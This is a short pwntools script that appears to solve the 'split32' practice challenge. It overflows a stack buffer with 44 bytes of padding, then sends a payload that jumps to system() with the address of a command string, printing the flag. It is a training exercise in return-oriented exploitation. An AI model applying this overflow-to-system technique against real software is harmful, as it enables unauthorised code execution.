
import pwn as pwntools

bin = './split32'

elf = pwntools.context.binary = pwntools.ELF(bin, checksec=False)
pwntools.context.log_level = 'info'

io = pwntools.process(argv=[], executable=bin)

padding = 44
system = 0x0804861a
cat = 0x804a030

payload = pwntools.flat(
    b'A' * padding,
    pwntools.pack(system),
    pwntools.pack(cat)
)

pwntools.write('py_payload', payload)

io.sendlineafter(b'> ', payload)

io.recvuntil(b"Thank you!\n")

pwntools.success(io.recvline().decode('utf-8'))
io.close()